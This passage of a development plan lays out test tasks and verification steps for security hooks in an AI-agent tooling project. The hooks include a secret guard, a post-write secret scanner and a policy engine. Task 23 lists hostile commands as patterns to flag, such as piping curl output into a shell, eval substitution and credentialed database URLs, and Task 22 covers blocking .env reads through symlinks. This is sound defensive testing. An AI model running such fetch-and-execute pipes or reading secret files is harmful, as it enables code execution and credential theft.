    - `python-testing`: pytest patterns, fixtures, parametrize for pattern testing

  **Parallelization**:
  - **Can Run In Parallel**: YES (with Tasks 18-23)
  - **Parallel Group**: Wave 3
  - **Blocks**: F1-F4
  - **Blocked By**: Tasks 2, 3, 4

  **References**:
  - `tests/hooks/test_post_write_behavior.py` — Existing test patterns to follow
  - `tests/hooks/test_post_write_optin.py` — Additional test patterns
  - `tests/hooks/helpers.py` — run_hook_json(), make_file_payload()
  - `hooks/post-write.py:80-120` — Updated SECRET_PATTERNS list (source of truth)

  **Acceptance Criteria**:
  - [ ] `pytest tests/hooks/test_post_write_patterns.py -v` → all pass, ≥28 tests (14 patterns × 2 each)
  - [ ] Zero false positives when scanning OAL source files

  ```
  Scenario: All pattern tests pass
    Tool: Bash
    Steps:
      1. Run: pytest tests/hooks/test_post_write_patterns.py -v 2>&1
      2. Assert: exit code 0
      3. Assert: ≥28 tests passed
    Expected Result: All secret pattern tests green
    Evidence: .sisyphus/evidence/task-17-pattern-tests.txt

  Scenario: Zero false positives on OAL source
    Tool: Bash
    Steps:
      1. For each hooks/*.py: run post-write.py against it
      2. Assert: no SECRET DETECTED in stderr for any OAL file
    Expected Result: OAL source is clean
    Evidence: .sisyphus/evidence/task-17-false-positive-scan.txt
  ```

  **Commit**: YES (groups with Wave 3)
  - Files: `tests/hooks/test_post_write_patterns.py`

---

- [ ] 18. Add Test File for circuit-breaker.py

  **What to do**:
  - Create `tests/hooks/test_circuit_breaker.py`
  - Test scenarios:
    1. Happy path: single failure recorded correctly
    2. Pattern normalization: `npm test` and `npm run test` normalized to same key
    3. Escalation trigger: 3+ failures on same pattern → escalation message in stderr
    4. Success clears pattern: success event clears matching failure entries
    5. Stale entry eviction: entries older than cutoff are removed
    6. Corrupt tracker recovery: malformed JSON in tracker file → graceful reset
    7. Tracker cap: >100 entries triggers cleanup
  - Use tmp_path fixture for isolated tracker files

  **Recommended Agent Profile**:
  - **Category**: `deep`
  - **Skills**: [`python-testing`]

  **Parallelization**:
  - **Can Run In Parallel**: YES (with Tasks 17, 19-23)
  - **Parallel Group**: Wave 3
  - **Blocks**: F1-F4
  - **Blocked By**: Task 8

  **References**:
  - `hooks/circuit-breaker.py` — Full source (read entirely before writing tests)
  - `tests/hooks/helpers.py` — run_hook_json(), get_decision()
  - `tests/hooks/test_firewall_policy.py` — Reference for test structure

  **Acceptance Criteria**:
  - [ ] `pytest tests/hooks/test_circuit_breaker.py -v` → all pass, ≥7 tests

  ```
  Scenario: Circuit breaker tests pass
    Tool: Bash
    Steps:
      1. Run: pytest tests/hooks/test_circuit_breaker.py -v 2>&1
      2. Assert: exit code 0
      3. Assert: ≥7 tests passed
    Expected Result: All circuit breaker tests green
    Evidence: .sisyphus/evidence/task-18-cb-tests.txt
  ```

  **Commit**: YES (groups with Wave 3)
  - Files: `tests/hooks/test_circuit_breaker.py`

---

- [ ] 19. Add Test File for test-validator.py

  **What to do**:
  - Create `tests/hooks/test_test_validator.py`
  - Test scenarios:
    1. Fake test detection: `assert True`, `assert 1 == 1`, `expect(true).toBe(true)`
    2. Boilerplate detection: ≥4 type checks + 0 behavior checks
    3. Happy-path-only detection: 5+ tests, 0 error/edge case tests
    4. Over-mocking detection: heavy mocks, minimal assertions
    5. Empty test body: test function with no assertions
    6. Clean test passes: well-written test with behavior assertions

  **Recommended Agent Profile**:
  - **Category**: `unspecified-high`
  - **Skills**: [`python-testing`]

  **Parallelization**:
  - **Can Run In Parallel**: YES
  - **Parallel Group**: Wave 3
  - **Blocks**: F1-F4
  - **Blocked By**: Task 1

  **References**:
  - `hooks/test-validator.py` — Full source (read entirely before writing tests)

  **Acceptance Criteria**:
  - [ ] `pytest tests/hooks/test_test_validator.py -v` → all pass, ≥6 tests

  **Commit**: YES (groups with Wave 3)
  - Files: `tests/hooks/test_test_validator.py`

---

- [ ] 20. Add Test File for tool-ledger.py

  **What to do**:
  - Create `tests/hooks/test_tool_ledger.py`
  - Test scenarios:
    1. Basic logging: Bash tool event creates JSONL entry
    2. Secret masking: stdout containing AWS key is masked in log
    3. Rotation trigger: file >5MB triggers rotation to .1 archive
    4. Archive backup: existing .1 moved to .2 before overwrite
    5. Run ID linking: entries share same run_id within session
    6. Format validation: each log entry is valid JSON

  **Recommended Agent Profile**:
  - **Category**: `unspecified-high`
  - **Skills**: [`python-testing`]

  **Parallelization**:
  - **Can Run In Parallel**: YES
  - **Parallel Group**: Wave 3
  - **Blocks**: F1-F4
  - **Blocked By**: Task 9

  **References**:
  - `hooks/tool-ledger.py` — Full source
  - `tests/hooks/helpers.py` — run_hook_json()

  **Acceptance Criteria**:
  - [ ] `pytest tests/hooks/test_tool_ledger.py -v` → all pass, ≥6 tests

  **Commit**: YES (groups with Wave 3)
  - Files: `tests/hooks/test_tool_ledger.py`

---

- [ ] 21. Add Test File for pre-compact.py

  **What to do**:
  - Create `tests/hooks/test_pre_compact.py`
  - Test scenarios:
    1. Snapshot creation: state files copied to snapshots/
    2. Handoff generation: handoff.md and handoff-portable.md created
    3. Missing state files: graceful degradation when profile.yaml absent
    4. Atomic writes: verify tempfile+replace pattern used (grep source)
    5. Git timeout: subprocess timeout doesn't crash hook

  **Recommended Agent Profile**:
  - **Category**: `unspecified-high`
  - **Skills**: [`python-testing`]

  **Parallelization**:
  - **Can Run In Parallel**: YES
  - **Parallel Group**: Wave 3
  - **Blocks**: F1-F4
  - **Blocked By**: Task 10

  **References**:
  - `hooks/pre-compact.py` — Full source
  - `tests/hooks/helpers.py` — run_hook_json()

  **Acceptance Criteria**:
  - [ ] `pytest tests/hooks/test_pre_compact.py -v` → all pass, ≥5 tests

  **Commit**: YES (groups with Wave 3)
  - Files: `tests/hooks/test_pre_compact.py`

---

- [ ] 22. Add Dedicated Test File for secret-guard.py

  **What to do**:
  - Create `tests/hooks/test_secret_guard.py`
  - Test scenarios:
    1. .env file denied: Read .env → deny decision
    2. Normal file allowed: Read src/main.py → allow
    3. .env.example readable: Read .env.example → allow
    4. Crash handler: import failure → deny + exit 0
    5. Flush verification: deny_decision output is flushed before exit
    6. Symlink .env: symlink to .env file → denied (via realpath)

  **Recommended Agent Profile**:
  - **Category**: `unspecified-high`
  - **Skills**: [`python-testing`]

  **Parallelization**:
  - **Can Run In Parallel**: YES
  - **Parallel Group**: Wave 3
  - **Blocks**: F1-F4
  - **Blocked By**: Tasks 6, 7

  **References**:
  - `hooks/secret-guard.py` — Full source
  - `tests/hooks/test_hardening.py` — Existing indirect tests (reference for patterns)
  - `tests/hooks/helpers.py` — make_file_payload(), get_decision()

  **Acceptance Criteria**:
  - [ ] `pytest tests/hooks/test_secret_guard.py -v` → all pass, ≥6 tests

  **Commit**: YES (groups with Wave 3)
  - Files: `tests/hooks/test_secret_guard.py`

---

- [ ] 23. Expand policy_engine.py Tests

  **What to do**:
  - Add to existing `tests/hooks/test_policy_engine.py`:
    1. Symlink resolution: symlink to .env → denied after realpath resolve
    2. Full-path shell: `curl | /bin/sh` → flagged
    3. Alternative shell: `curl | zsh` → flagged
    4. Eval variant: `eval $(command)` → flagged
    5. Expanded DB URL: `mariadb://user:pass@host` → flagged by post-write
    6. Permission matrix: test multiple file types × tool types combinations

  **Recommended Agent Profile**:
  - **Category**: `unspecified-high`
  - **Skills**: [`python-testing`]

  **Parallelization**:
  - **Can Run In Parallel**: YES
  - **Parallel Group**: Wave 3
  - **Blocks**: F1-F4
  - **Blocked By**: Task 5

  **References**:
  - `tests/hooks/test_policy_engine.py` — Existing 6 tests (append to this file)
  - `hooks/policy_engine.py:118-160` — Updated bash command patterns

  **Acceptance Criteria**:
  - [ ] `pytest tests/hooks/test_policy_engine.py -v` → all pass, ≥12 tests (6 existing + 6 new)

  **Commit**: YES (groups with Wave 3)
  - Files: `tests/hooks/test_policy_engine.py`

---
## Final Verification Wave (MANDATORY — after ALL implementation tasks)

> 4 review agents run in PARALLEL. ALL must APPROVE. Rejection → fix → re-run.

- [ ] F1. **Plan Compliance Audit** — `oracle`
  Read the plan end-to-end. For each "Must Have": verify implementation exists (read file, run command). For each "Must NOT Have": search codebase for forbidden patterns — reject with file:line if found. Check evidence files exist in .sisyphus/evidence/. Compare deliverables against plan.
  Output: `Must Have [N/N] | Must NOT Have [N/N] | Tasks [N/N] | VERDICT: APPROVE/REJECT`

- [ ] F2. **Code Quality Review** — `unspecified-high`
  Run `pytest tests/ -x -q`. Review all changed hooks for: `sys.exit` non-zero paths, missing try/except, `as any` equivalents, empty catches, print() to stdout in non-output hooks. Check AI slop: excessive comments, over-abstraction.
  Output: `Tests [N pass/N fail] | Exit codes [CLEAN/N issues] | Files [N clean/N issues] | VERDICT`

- [ ] F3. **Full Regression + False Positive Scan** — `unspecified-high`
  Run `pytest tests/ -x -q` → must show ≥224+(new tests) passed. Run post-write.py against every OAL source file (`hooks/*.py`, `tests/**/*.py`, `commands/*.md`) → must produce zero "SECRET DETECTED" false positives. Run `grep -rn 'sys.exit\|exit(' hooks/*.py` → verify only `exit(0)` on all paths.
  Output: `Tests [PASS/FAIL] | False Positives [N] | Exit Discipline [CLEAN/N issues] | VERDICT`

- [ ] F4. **Scope Fidelity Check** — `deep`
  For each task: read "What to do", read actual diff. Verify 1:1 — everything in spec was built (no missing), nothing beyond spec was built (no creep). Check "Must NOT do" compliance. Detect cross-task contamination: Task N touching Task M's files. Flag unaccounted changes.
  Output: `Tasks [N/N compliant] | Contamination [CLEAN/N issues] | VERDICT`

---

## Commit Strategy

- **Commit after each Wave** (not after each task):
  - Wave 1: `fix(security): harden secret detection regex + expand bash command patterns`
  - Wave 2: `fix(reliability): atomic state writes + fix command references`
  - Wave 3: `test(hooks): add coverage for untested hooks + expand existing tests`
  - Final: `chore: update README hook count + docs`

---

## Success Criteria

### Verification Commands
```bash
pytest tests/ -x -q                    # Expected: all pass, count ≥ 260
grep -n 'sys.exit\|exit(' hooks/*.py   # Expected: only exit(0) on every line
# False positive scan:
for f in hooks/*.py; do echo '{"tool_input":{"file_path":"'$f'"}}' | python3 hooks/post-write.py 2>&1; done
# Expected: no SECRET DETECTED output
```

### Final Checklist
- [ ] All "Must Have" present
- [ ] All "Must NOT Have" absent
- [ ] All existing tests still pass
- [ ] New test count ≥ 40 additional tests
- [ ] Zero false positives on OAL source scan
- [ ] Exit(0) discipline across all hooks
